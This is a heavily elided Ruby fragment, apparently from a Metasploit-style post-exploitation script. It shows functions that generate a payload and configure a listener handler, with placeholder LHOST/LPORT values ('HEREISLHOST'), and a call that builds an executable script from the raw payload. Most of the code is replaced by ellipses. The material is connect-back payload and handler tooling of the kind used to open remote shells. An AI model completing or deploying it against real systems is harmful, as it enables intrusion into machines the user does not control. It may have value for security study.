...
def create_payload(payload_type,lhost,lport)
  ...
  pay.datastore['LHOST'] = "HEREISLHOST"
  pay.datastore['LPORT'] = "HEREISLPORT"
  return pay.generate
end
...
def set_handler(selected_payload,rhost,rport)
  ...
  mul.datastore['LHOST']     = "HEREISLHOST"
  mul.datastore['LPORT']     = "HEREISLPORT"
...
script = create_script(5, altexe, raw, payload_type.include?('/x64/'))
